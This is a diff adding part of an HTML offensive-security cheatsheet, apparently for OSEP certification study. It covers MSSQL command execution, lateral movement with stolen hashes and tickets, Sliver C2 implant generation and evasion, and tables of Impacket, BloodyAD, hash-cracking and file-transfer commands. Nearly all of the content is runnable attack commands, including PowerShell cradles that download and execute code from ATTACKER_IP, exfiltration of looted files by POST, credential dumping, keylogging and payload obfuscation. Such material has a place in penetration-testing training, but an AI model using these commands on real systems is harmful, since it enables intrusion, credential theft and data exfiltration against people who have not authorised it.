+<!--  8. MSSQL                                                    -->
+<!-- ============================================================ -->
+<h2 id="mssql">8. MSSQL</h2>
+<p>Enumerating and exploiting Microsoft SQL Server for command execution and lateral movement.</p>
+
+<h3 id="mssql-enum">8.1 Enumeration</h3>
+
+<pre><code class="language-bash"># Discover MSSQL instances
+crackmapexec mssql SUBNET/24
+nmap -p 1433 --open -sV SUBNET/24
+
+# Connect with Impacket
+impacket-mssqlclient corp.local/user:'Password123'@SQL_IP -windows-auth
+
+# Connect with sqsh
+sqsh -S SQL_IP -U 'corp\user' -P 'Password123'
+</code></pre>
+
+<pre><code class="language-sql">-- Basic enumeration (inside MSSQL session)
+SELECT @@version;
+SELECT name FROM master.dbo.sysdatabases;
+SELECT name FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';
+SELECT * FROM sys.server_role_members;
+
+-- Check current user and privileges
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+
+-- List logins and their roles
+SELECT sp.name AS login, sp.type_desc, sp.is_disabled,
+  STRING_AGG(srm.role_principal_id, ',') AS roles
+FROM sys.server_principals sp
+LEFT JOIN sys.server_role_members srm ON sp.principal_id = srm.member_principal_id
+WHERE sp.type IN ('S','U','G')
+GROUP BY sp.name, sp.type_desc, sp.is_disabled;
+</code></pre>
+
+<h3 id="mssql-xpcmdshell">8.2 Command Execution &mdash; xp_cmdshell</h3>
+
+<pre><code class="language-sql">-- Enable xp_cmdshell
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+-- Execute commands
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payload.ps1'')"';
+</code></pre>
+
+<h3 id="mssql-ole">8.3 Command Execution &mdash; Ole Automation</h3>
+
+<pre><code class="language-sql">-- Enable Ole Automation Procedures
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+
+-- Execute via WScript.Shell
+DECLARE @output INT;
+EXEC sp_OACreate 'WScript.Shell', @output OUT;
+EXEC sp_OAMethod @output, 'Run', NULL, 'cmd /c whoami > C:\Windows\Temp\output.txt';
+EXEC sp_OADestroy @output;
+
+-- Read output
+EXEC xp_cmdshell 'type C:\Windows\Temp\output.txt';
+</code></pre>
+
+<h3 id="mssql-linked">8.4 Linked Servers</h3>
+
+<pre><code class="language-sql">-- Enumerate linked servers
+EXEC sp_linkedservers;
+SELECT * FROM sys.servers;
+
+-- Execute query on linked server
+SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version');
+SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER');
+SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+
+-- Enable xp_cmdshell on linked server
+EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER];
+EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER];
+
+-- RCE on linked server
+EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
+
+-- Double-hop through linked servers
+SELECT * FROM OPENQUERY([LINK1], 'SELECT * FROM OPENQUERY([LINK2], ''SELECT @@version'')');
+</code></pre>
+
+<h3 id="mssql-privesc">8.5 Privilege Escalation</h3>
+
+<pre><code class="language-sql">-- Impersonate another login
+SELECT DISTINCT b.name FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
+
+-- Execute as higher-privilege user
+EXECUTE AS LOGIN = 'sa';
+EXEC xp_cmdshell 'whoami';
+REVERT;
+
+-- UNC path injection (capture NTLMv2 hash)
+EXEC xp_dirtree '\\ATTACKER_IP\share', 1, 1;
+-- On attacker: responder -I eth0 or impacket-smbserver
+</code></pre>
+
+<pre><code class="language-bash"># Crack captured NTLMv2 hash
+hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
+
+# Relay NTLM (if SMB signing disabled on target)
+impacket-ntlmrelayx -t smb://TARGET_IP -smb2support -c 'whoami'
+</code></pre>
+
+<h3 id="mssql-clr">8.6 CLR Assembly Execution</h3>
+
+<pre><code class="language-sql">-- Enable CLR integration
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
+EXEC sp_configure 'clr strict security', 0; RECONFIGURE;
+
+-- Set database to TRUSTWORTHY
+ALTER DATABASE msdb SET TRUSTWORTHY ON;
+
+-- Create assembly from DLL bytes (pre-compiled C# DLL)
+CREATE ASSEMBLY [CmdExec]
+FROM 0x4D5A900003... -- hex bytes of DLL
+WITH PERMISSION_SET = UNSAFE;
+
+-- Create stored procedure from assembly
+CREATE PROCEDURE [dbo].[cmd_exec] @cmd NVARCHAR(MAX)
+AS EXTERNAL NAME [CmdExec].[StoredProcedures].[cmd_exec];
+
+-- Execute
+EXEC cmd_exec 'whoami';
+</code></pre>
+
+<h3 id="mssql-quick-ref">8.7 Quick Reference</h3>
+
+<table class="table table-bordered table-dark table-striped">
+  <thead>
+    <tr>
+      <th>Task</th>
+      <th>Command</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Current user</td>
+      <td><code>SELECT SYSTEM_USER;</code></td>
+    </tr>
+    <tr>
+      <td>Check sysadmin</td>
+      <td><code>SELECT IS_SRVROLEMEMBER('sysadmin');</code></td>
+    </tr>
+    <tr>
+      <td>List databases</td>
+      <td><code>SELECT name FROM master.dbo.sysdatabases;</code></td>
+    </tr>
+    <tr>
+      <td>List tables</td>
+      <td><code>SELECT * FROM INFORMATION_SCHEMA.TABLES;</code></td>
+    </tr>
+    <tr>
+      <td>List linked servers</td>
+      <td><code>EXEC sp_linkedservers;</code></td>
+    </tr>
+    <tr>
+      <td>Enable xp_cmdshell</td>
+      <td><code>EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;</code></td>
+    </tr>
+    <tr>
+      <td>Execute OS command</td>
+      <td><code>EXEC xp_cmdshell 'whoami';</code></td>
+    </tr>
+    <tr>
+      <td>Read file</td>
+      <td><code>SELECT * FROM OPENROWSET(BULK N'C:\file.txt', SINGLE_CLOB) AS Contents;</code></td>
+    </tr>
+    <tr>
+      <td>UNC hash capture</td>
+      <td><code>EXEC xp_dirtree '\\ATTACKER_IP\share';</code></td>
+    </tr>
+    <tr>
+      <td>Check impersonation</td>
+      <td><code>SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE';</code></td>
+    </tr>
+  </tbody>
+</table>
+
+
+<!-- ============================================================ -->
+<!--  9. LATERAL MOVEMENT                                         -->
+<!-- ============================================================ -->
+<h2 id="lateral-movement">9. Lateral Movement</h2>
+<p>Moving between hosts using stolen credentials, hashes, and tickets.</p>
+
+<h3 id="lm-pth">9.1 Pass-the-Hash</h3>
+
+<pre><code class="language-bash"># Evil-WinRM (requires port 5985)
+evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH
+
+# Impacket psexec
+impacket-psexec -hashes :NTLM_HASH corp.local/Administrator@TARGET_IP
+
+# Impacket wmiexec (no service creation — stealthier)
+impacket-wmiexec -hashes :NTLM_HASH corp.local/Administrator@TARGET_IP
+
+# Impacket smbexec
+impacket-smbexec -hashes :NTLM_HASH corp.local/Administrator@TARGET_IP
+
+# Impacket atexec (scheduled task-based)
+impacket-atexec -hashes :NTLM_HASH corp.local/Administrator@TARGET_IP "whoami"
+
+# CrackMapExec mass PtH
+crackmapexec smb SUBNET/24 -u Administrator -H NTLM_HASH
+crackmapexec smb SUBNET/24 -u Administrator -H NTLM_HASH -x "whoami"
+crackmapexec winrm SUBNET/24 -u Administrator -H NTLM_HASH
+</code></pre>
+
+<h3 id="lm-overpass">9.2 Overpass-the-Hash</h3>
+
+<pre><code class="language-bash"># Request TGT with NTLM hash
+impacket-getTGT corp.local/Administrator -hashes :NTLM_HASH -dc-ip DC_IP
+
+# Use the ticket
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@TARGET.corp.local
+</code></pre>
+
+<pre><code class="language-powershell"># Rubeus — overpass-the-hash
+.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
+
+# Verify
+klist
+dir \\TARGET\C$
+</code></pre>
+
+<h3 id="lm-dcom">9.3 DCOM Execution</h3>
+
+<pre><code class="language-bash"># Impacket DCOM exec
+impacket-dcomexec -hashes :NTLM_HASH corp.local/Administrator@TARGET_IP
+</code></pre>
+
+<pre><code class="language-powershell"># PowerShell DCOM — MMC20.Application
+$dcom = [System.Activator]::CreateInstance(
+  [Type]::GetTypeFromProgID("MMC20.Application.1", "TARGET_IP"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')""", "7")
+
+# ShellWindows DCOM
+$dcom = [System.Activator]::CreateInstance(
+  [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET_IP"))
+$item = $dcom.Item()
+$item.Document.Application.ShellExecute("cmd.exe", "/c C:\Windows\Temp\payload.exe", "", $null, 0)
+</code></pre>
+
+<h3 id="lm-winrm">9.4 WinRM</h3>
+
+<pre><code class="language-powershell"># PowerShell Remoting
+Enter-PSSession -ComputerName TARGET -Credential corp\Administrator
+
+# Invoke command remotely
+Invoke-Command -ComputerName TARGET -Credential corp\Administrator -ScriptBlock {
+  whoami; hostname; ipconfig
+}
+
+# Invoke on multiple hosts
+Invoke-Command -ComputerName TARGET1,TARGET2,TARGET3 -ScriptBlock { whoami }
+</code></pre>
+
+<pre><code class="language-bash"># Evil-WinRM with password
+evil-winrm -i TARGET_IP -u Administrator -p 'Password123'
+
+# Evil-WinRM with hash
+evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH
+
+# Evil-WinRM with Kerberos ticket
+export KRB5CCNAME=Administrator.ccache
+evil-winrm -i TARGET.corp.local -r corp.local
+</code></pre>
+
+<h3 id="lm-pivoting-through-hosts">9.5 Pivoting Through Compromised Hosts</h3>
+
+<pre><code class="language-bash"># Scenario: Attacker -> Host A -> Host B (internal)
+
+# Option 1: proxychains through existing tunnel
+proxychains evil-winrm -i HOST_B_IP -u admin -H HASH
+
+# Option 2: port forward via ligolo for direct access
+# (See Tunneling section for ligolo double pivot setup)
+
+# Option 3: Impacket through SOCKS
+proxychains impacket-psexec -hashes :HASH corp.local/admin@HOST_B_IP
+
+# CrackMapExec through SOCKS
+proxychains crackmapexec smb HOST_B_SUBNET/24 -u admin -H HASH --shares
+</code></pre>
+
+<pre><code class="language-powershell"># From compromised Windows host — WMI lateral movement
+$cred = New-Object System.Management.Automation.PSCredential("corp\admin",
+  (ConvertTo-SecureString "Password123" -AsPlainText -Force))
+Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName HOST_B `
+  -Credential $cred -ArgumentList "powershell -ep bypass -c ""IEX(...)"""
+</code></pre>
+
+
+<!-- ============================================================ -->
+<!--  10. UTILITIES                                               -->
+<!-- ============================================================ -->
+<h2 id="utilities">10. Utilities</h2>
+<p>Key tools and frameworks used throughout OSEP engagements.</p>
+
+<h3 id="util-sliver">10.1 Sliver C2</h3>
+
+<pre><code class="language-bash"># Start Sliver
+sliver-server
+# or connect as operator
+sliver
+
+# === Listeners ===
+# HTTPS listener
+https -l 443 -d example.com
+
+# HTTP listener
+http -l 80
+
+# mTLS listener
+mtls -l 8888
+
+# DNS listener
+dns -d c2.example.com -l 53
+
+# List active listeners (jobs)
+jobs
+</code></pre>
+
+<pre><code class="language-bash"># === Implant Generation ===
+# Windows HTTPS beacon
+generate beacon --http ATTACKER_IP:443 --os windows --arch amd64 --name win-beacon --save /tmp/
+
+# Windows mTLS session
+generate --mtls ATTACKER_IP:8888 --os windows --arch amd64 --name win-session --save /tmp/
+
+# Linux implant
+generate --http ATTACKER_IP:443 --os linux --arch amd64 --name linux-imp --save /tmp/
+
+# Shellcode generation
+generate beacon --http ATTACKER_IP:443 --os windows --arch amd64 --format shellcode --save /tmp/beacon.bin
+
+# Stager (smaller initial payload)
+generate stager --lhost ATTACKER_IP --lport 443 --protocol http --os windows --arch amd64 --save /tmp/stager.bin
+
+# List implants
+implants
+</code></pre>
+
+<pre><code class="language-bash"># === Session / Beacon Management ===
+# List sessions and beacons
+sessions
+beacons
+
+# Interact with a session
+use SESSION_ID
+
+# Interact with a beacon
+use BEACON_ID
+
+# Basic commands in session
+whoami
+getuid
+getpid
+ps
+ifconfig
+netstat
+ls
+cd C:\\Users
+cat C:\\Users\\admin\\Desktop\\flag.txt
+download C:\\loot\\file.txt /tmp/loot/
+upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe
+
+# Execute commands
+execute -o cmd.exe /c "ipconfig /all"
+shell
+
+# Process management
+ps
+procdump -p PID -s /tmp/dump.bin
+migrate -p TARGET_PID
+</code></pre>
+
+<pre><code class="language-bash"># === Pivots ===
+# Set up a pivot listener on a compromised host
+# In a session on the pivot host:
+pivot tcp --bind 0.0.0.0:9999
+
+# Generate implant that connects through pivot
+generate --tcp PIVOT_HOST_IP:9999 --os windows --arch amd64 --save /tmp/pivot-implant
+
+# Named pipe pivot (stealthier on Windows)
+pivot namedpipe --name svcpipe
+
+# List active pivots
+pivots
+</code></pre>
+
+<pre><code class="language-bash"># === Post-Exploitation in Sliver ===
+# Credential harvesting
+hashdump
+mimikatz "sekurlsa::logonpasswords"
+
+# Port forwarding through session
+portfwd add -b 127.0.0.1:8445 -r TARGET_IP:445
+
+# SOCKS proxy
+socks5 start -p 1080
+
+# Screenshot and keylogging
+screenshot
+keylogger start
+</code></pre>
+
+<pre><code class="language-bash"># === Evasion & Staging ===
+# Generate with custom process name
+generate beacon --http ATTACKER_IP:443 --os windows --arch amd64 \
+  --name svchost --process-name svchost.exe --save /tmp/
+
+# Encode/encrypt implant
+# Sliver implants are already encrypted; for additional evasion:
+# Use external packers (sgn, donut) on shellcode output
+
+# Donut — convert .NET assembly to position-independent shellcode
+donut -i implant.exe -o loader.bin
+
+# sgn — shikata ga nai encoder for shellcode
+sgn -i beacon.bin -o encoded.bin -a amd64 --badchars ""
+
+# === Profile Management ===
+# List profiles (saved implant configs)
+profiles
+
+# Create reusable profile
+profiles new beacon --http ATTACKER_IP:443 --os windows --arch amd64 --name default-win
+
+# Generate from profile
+profiles generate --name default-win --save /tmp/
+
+# === Armory (Extensions/BOFs) ===
+armory install rubeus
+armory install seatbelt
+armory install sharpup
+
+# Use installed extension
+rubeus kerberoast
+seatbelt -- -group=all
+</code></pre>
+
+<pre><code class="language-bash"># === Sliver Multiplayer (Team Server) ===
+# Generate operator config
+sliver-server operator --name operator1 --lhost TEAM_SERVER_IP --save operator1.cfg
+
+# Connect as operator
+sliver --config operator1.cfg
+
+# === Useful Sliver Commands Reference ===
+# File system
+ls / cat / cd / pwd / mkdir / rm / download / upload
+
+# Network
+ifconfig / netstat / portfwd / socks5 / rportfwd
+
+# Process
+ps / procdump / migrate / execute / execute-assembly
+
+# Credentials
+hashdump / mimikatz
+
+# Recon
+screenshot / keylogger / env / registry read
+
+# Implant control
+background  # send session to background
+kill         # terminate session
+rename       # rename beacon/session
+</code></pre>
+
+<h3 id="util-impacket">10.2 Impacket Suite</h3>
+
+<table class="table table-bordered table-dark table-striped">
+  <thead>
+    <tr>
+      <th>Script</th>
+      <th>Purpose</th>
+      <th>Example</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>psexec</td>
+      <td>Remote command execution via SMB service</td>
+      <td><code>impacket-psexec -hashes :HASH domain/user@IP</code></td>
+    </tr>
+    <tr>
+      <td>wmiexec</td>
+      <td>Remote exec via WMI (stealthier)</td>
+      <td><code>impacket-wmiexec -hashes :HASH domain/user@IP</code></td>
+    </tr>
+    <tr>
+      <td>smbexec</td>
+      <td>Remote exec via SMB</td>
+      <td><code>impacket-smbexec -hashes :HASH domain/user@IP</code></td>
+    </tr>
+    <tr>
+      <td>atexec</td>
+      <td>Remote exec via scheduled task</td>
+      <td><code>impacket-atexec -hashes :HASH domain/user@IP &quot;cmd&quot;</code></td>
+    </tr>
+    <tr>
+      <td>dcomexec</td>
+      <td>Remote exec via DCOM</td>
+      <td><code>impacket-dcomexec -hashes :HASH domain/user@IP</code></td>
+    </tr>
+    <tr>
+      <td>secretsdump</td>
+      <td>Dump SAM/LSA/NTDS hashes remotely</td>
+      <td><code>impacket-secretsdump domain/user:'pass'@IP</code></td>
+    </tr>
+    <tr>
+      <td>GetUserSPNs</td>
+      <td>Kerberoasting</td>
+      <td><code>impacket-GetUserSPNs domain/user:'pass' -request</code></td>
+    </tr>
+    <tr>
+      <td>GetNPUsers</td>
+      <td>AS-REP Roasting</td>
+      <td><code>impacket-GetNPUsers domain/ -usersfile u.txt</code></td>
+    </tr>
+    <tr>
+      <td>getTGT</td>
+      <td>Request TGT with password/hash</td>
+      <td><code>impacket-getTGT domain/user -hashes :HASH</code></td>
+    </tr>
+    <tr>
+      <td>getST</td>
+      <td>Request service ticket (S4U delegation)</td>
+      <td><code>impacket-getST domain/svc -spn cifs/host -impersonate admin</code></td>
+    </tr>
+    <tr>
+      <td>ticketer</td>
+      <td>Create golden/silver tickets</td>
+      <td><code>impacket-ticketer -nthash HASH -domain-sid SID -domain dom admin</code></td>
+    </tr>
+    <tr>
+      <td>ntlmrelayx</td>
+      <td>NTLM relay attacks</td>
+      <td><code>impacket-ntlmrelayx -t smb://IP -smb2support</code></td>
+    </tr>
+    <tr>
+      <td>mssqlclient</td>
+      <td>Interactive MSSQL client</td>
+      <td><code>impacket-mssqlclient domain/user:'pass'@IP -windows-auth</code></td>
+    </tr>
+    <tr>
+      <td>smbclient</td>
+      <td>Interactive SMB client</td>
+      <td><code>impacket-smbclient domain/user:'pass'@IP</code></td>
+    </tr>
+    <tr>
+      <td>addcomputer</td>
+      <td>Add machine account to domain</td>
+      <td><code>impacket-addcomputer domain/user:'pass' -computer-name FAKE01$</code></td>
+    </tr>
+    <tr>
+      <td>rbcd</td>
+      <td>Resource-based constrained delegation</td>
+      <td><code>impacket-rbcd domain/user:'pass' -delegate-from FAKE01$ -delegate-to TARGET$</code></td>
+    </tr>
+    <tr>
+      <td>dacledit</td>
+      <td>Edit DACLs on AD objects</td>
+      <td><code>impacket-dacledit domain/user:'pass' -action write -rights FullControl</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="util-bloodyad">10.3 BloodyAD Commands</h3>
+
+<table class="table table-bordered table-dark table-striped">
+  <thead>
+    <tr>
+      <th>Action</th>
+      <th>Command</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Reset password</td>
+      <td><code>bloodyAD -d DOMAIN -u USER -p PASS --host DC set password TARGET 'NewPass'</code></td>
+    </tr>
+    <tr>
+      <td>Add to group</td>
+      <td><code>bloodyAD -d DOMAIN -u USER -p PASS --host DC add groupMember "GROUP" MEMBER</code></td>
+    </tr>
+    <tr>
+      <td>Grant GenericAll</td>
+      <td><code>bloodyAD -d DOMAIN -u USER -p PASS --host DC add genericAll TARGET PRINCIPAL</code></td>
+    </tr>
+    <tr>
+      <td>Set owner</td>
+      <td><code>bloodyAD -d DOMAIN -u USER -p PASS --host DC set owner TARGET PRINCIPAL</code></td>
+    </tr>
+    <tr>
+      <td>Set RBCD</td>
+      <td><code>bloodyAD -d DOMAIN -u USER -p PASS --host DC add rbcd TARGET FAKE01$</code></td>
+    </tr>
+    <tr>
+      <td>Add shadow cred</td>
+      <td><code>bloodyAD -d DOMAIN -u USER -p PASS --host DC add shadowCredentials TARGET</code></td>
+    </tr>
+    <tr>
+      <td>Set SPN</td>
+      <td><code>bloodyAD -d DOMAIN -u USER -p PASS --host DC set object TARGET servicePrincipalName -v 'fake/spn'</code></td>
+    </tr>
+    <tr>
+      <td>Disable preauth</td>
+      <td><code>bloodyAD -d DOMAIN -u USER -p PASS --host DC add uac TARGET -f DONT_REQ_PREAUTH</code></td>
+    </tr>
+    <tr>
+      <td>Read GMSA password</td>
+      <td><code>bloodyAD -d DOMAIN -u USER -p PASS --host DC get object 'GMSA_ACCOUNT$' --attr msDS-ManagedPassword</code></td>
+    </tr>
+    <tr>
+      <td>Get domain info</td>
+      <td><code>bloodyAD -d DOMAIN -u USER -p PASS --host DC get object 'DC=domain,DC=local' --attr ms-DS-MachineAccountQuota</code></td>
+    </tr>
+  </tbody>
+</table>
+
+
+<h3 id="util-hashcracking">10.4 Hash Cracking Reference</h3>
+
+<table class="table table-bordered table-dark table-striped">
+  <thead>
+    <tr>
+      <th>Hash Type</th>
+      <th>Hashcat Mode</th>
+      <th>Example Source</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>NTLM</td>
+      <td><code>-m 1000</code></td>
+      <td>SAM dump, secretsdump, mimikatz</td>
+    </tr>
+    <tr>
+      <td>NTLMv2</td>
+      <td><code>-m 5600</code></td>
+      <td>Responder, LLMNR poisoning</td>
+    </tr>
+    <tr>
+      <td>Kerberos TGS (RC4)</td>
+      <td><code>-m 13100</code></td>
+      <td>Kerberoasting</td>
+    </tr>
+    <tr>
+      <td>Kerberos TGS (AES-256)</td>
+      <td><code>-m 19700</code></td>
+      <td>Kerberoasting (AES)</td>
+    </tr>
+    <tr>
+      <td>AS-REP (RC4)</td>
+      <td><code>-m 18200</code></td>
+      <td>AS-REP Roasting</td>
+    </tr>
+    <tr>
+      <td>MD5</td>
+      <td><code>-m 0</code></td>
+      <td>Web applications, databases</td>
+    </tr>
+    <tr>
+      <td>SHA-256</td>
+      <td><code>-m 1400</code></td>
+      <td>Web applications</td>
+    </tr>
+    <tr>
+      <td>SHA-512 ($6$)</td>
+      <td><code>-m 1800</code></td>
+      <td>/etc/shadow (Linux)</td>
+    </tr>
+    <tr>
+      <td>DCC2 (mscache2)</td>
+      <td><code>-m 2100</code></td>
+      <td>Cached domain credentials</td>
+    </tr>
+    <tr>
+      <td>Kerberos TGT (RC4)</td>
+      <td><code>-m 7500</code></td>
+      <td>AS-REQ TGT</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash"># Hashcat common usage
+hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m MODE hash.txt --show  # display cracked
+
+# John the Ripper
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+</code></pre>
+
+<h3 id="util-file-transfer">10.5 File Transfer Cheatsheet</h3>
+
+<table class="table table-bordered table-dark table-striped">
+  <thead>
+    <tr>
+      <th>Method</th>
+      <th>Attacker (Serve)</th>
+      <th>Target (Download)</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Python HTTP</td>
+      <td><code>python3 -m http.server 80</code></td>
+      <td><code>wget http://IP/file</code> or <code>certutil -urlcache -f http://IP/file out</code></td>
+    </tr>
+    <tr>
+      <td>Impacket SMB</td>
+      <td><code>impacket-smbserver share . -smb2support</code></td>
+      <td><code>copy \\IP\share\file C:\Temp\</code></td>
+    </tr>
+    <tr>
+      <td>Impacket SMB (auth)</td>
+      <td><code>impacket-smbserver share . -smb2support -user a -password a</code></td>
+      <td><code>net use \\IP\share /u:a a</code> then <code>copy \\IP\share\file .</code></td>
+    </tr>
+    <tr>
+      <td>PowerShell</td>
+      <td><code>python3 -m http.server 80</code></td>
+      <td><code>Invoke-WebRequest -Uri http://IP/file -OutFile out</code></td>
+    </tr>
+    <tr>
+      <td>Certutil</td>
+      <td><code>python3 -m http.server 80</code></td>
+      <td><code>certutil -urlcache -f http://IP/file out</code></td>
+    </tr>
+    <tr>
+      <td>SCP</td>
+      <td>(direct)</td>
+      <td><code>scp user@IP:/path/file ./file</code></td>
+    </tr>
+    <tr>
+      <td>Netcat</td>
+      <td><code>nc -lvnp 9999 &lt; file</code></td>
+      <td><code>nc IP 9999 &gt; file</code></td>
+    </tr>
+    <tr>
+      <td>Base64 (small files)</td>
+      <td><code>base64 file</code></td>
+      <td><code>echo BASE64 | base64 -d &gt; file</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-powershell"># PowerShell upload (exfil from target)
+# Attacker: python3 uploadserver
+$bytes = [IO.File]::ReadAllBytes("C:\loot\file.txt")
+$encoded = [Convert]::ToBase64String($bytes)
+Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/upload" -Method POST -Body $encoded
+
+# PowerShell download and execute in memory (fileless)
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')
+
+# PowerShell download with custom user-agent
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0")
+$wc.DownloadFile("http://ATTACKER_IP/file.exe", "C:\Windows\Temp\file.exe")
+</code></pre>
+
+
+          </div>
+        </div>
+      </div>
+    </section><!-- End Cheatsheet Section -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Section Index ======= -->
+  <div id="index" class="index">
+    <div class="container mt-3">
+      <div class="input-group mb-3">
+        <input type="text" id="search-input" class="form-control" placeholder="Search sections..." aria-label="Search sections" aria-describedby="search-button">
+        <button class="btn btn-primary" type="button" id="search-button">
+          <i class="bi bi-search"></i>
+        </button>
+      </div>
+    </div>
+    <button class="expand-collapse-btn" onclick="toggleAll()">Show/Hide All</button>
+
+    <div class="section-flow-1">
+      <button class="dropdown-btn">1. Reconnaissance
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#recon-external-nmap">1.1 External Scanning &mdash; Nmap</a>
+        <a href="#recon-external-rustscan">1.2 External Scanning &mdash; RustScan</a>
+        <a href="#recon-internal-scanning">1.3 Internal Scanning from Foothold</a>
+        <a href="#recon-service-enum">1.4 Service Enumeration</a>
+        <a href="#recon-web-enum">1.5 Web Enumeration</a>
+      </div>
+    </div>
+
+    <div class="section-flow-2">
+      <button class="dropdown-btn">2. Initial Access
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#ia-vba-macros">2.1 VBA Macros</a>
+        <a href="#ia-hta">2.2 HTA Files</a>
+        <a href="#ia-iso">2.3 ISO Containers</a>
+        <a href="#ia-shellcode-loader">2.4 Shellcode Loader &mdash; C# XOR Decrypt</a>
+        <a href="#ia-amsi-etw">2.5 AMSI &amp; ETW Bypass</a>
+        <a href="#ia-clm-bypass">2.6 Constrained Language Mode Bypass</a>
+        <a href="#ia-applocker-bypass">2.7 AppLocker Bypass</a>
+        <a href="#ia-powershell-cradles">2.8 PowerShell Cradles</a>
+      </div>
+    </div>
+
+    <div class="section-flow-3">
+      <button class="dropdown-btn">3. Post-Exploitation: Windows
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#pw-situational-awareness">3.1 Situational Awareness</a>
+        <a href="#pw-file-operations">3.2 File Operations</a>
+        <a href="#pw-av-enum">3.3 AV &amp; EDR Enumeration</a>
+        <a href="#pw-persistence">3.4 Persistence</a>
+        <a href="#pw-privesc">3.5 Privilege Escalation</a>
+        <a href="#pw-credential-access">3.6 Credential Access</a>
+        <a href="#pw-defense-evasion">3.7 Defense Evasion</a>
+      </div>
+    </div>
+
+    <div class="section-flow-4">
+      <button class="dropdown-btn">4. Post-Exploitation: Linux
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#pl-enumeration">4.1 Enumeration</a>
+        <a href="#pl-reverse-shells">4.2 Reverse Shells</a>
+        <a href="#pl-persistence">4.3 Persistence</a>
+        <a href="#pl-privesc">4.4 Privilege Escalation</a>
+        <a href="#pl-credential-access">4.5 Credential Access</a>
+        <a href="#pl-lateral">4.6 Lateral Movement from Linux</a>
+      </div>
+    </div>
+
+    <div class="section-flow-5">
+      <button class="dropdown-btn">5. Tunneling &amp; Pivoting
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#tp-ssh-tunneling">5.1 SSH Tunneling</a>
+        <a href="#tp-ligolo">5.2 Ligolo-ng</a>
+        <a href="#tp-ligolo-double">5.3 Ligolo-ng Double Pivot</a>
+        <a href="#tp-chisel">5.4 Chisel</a>
+        <a href="#tp-socks-proxy">5.5 SOCKS Proxy &amp; Proxychains</a>
+      </div>
+    </div>
+
+    <div class="section-flow-6">
+      <button class="dropdown-btn">6. Active Directory Enumeration
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#ade-net-commands">6.1 Net Commands</a>
+        <a href="#ade-powerview">6.2 PowerView</a>
+        <a href="#ade-bloodhound">6.3 SharpHound &amp; BloodHound</a>
+        <a href="#ade-ldapsearch">6.4 LDAP Enumeration</a>
+        <a href="#ade-acl">6.5 ACL Enumeration</a>
+        <a href="#ade-trust-mapping">6.6 Trust Mapping</a>
+      </div>
+    </div>
+
+    <div class="section-flow-7">
+      <button class="dropdown-btn">7. Active Directory Exploitation
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#adx-kerberoasting">7.1 Kerberoasting</a>
+        <a href="#adx-asrep">7.2 AS-REP Roasting</a>
+        <a href="#adx-unconstrained-delegation">7.3 Unconstrained Delegation</a>
+        <a href="#adx-constrained-delegation">7.4 Constrained Delegation</a>
+        <a href="#adx-dcsync">7.5 DCSync</a>
+        <a href="#adx-golden-ticket">7.6 Golden Ticket</a>
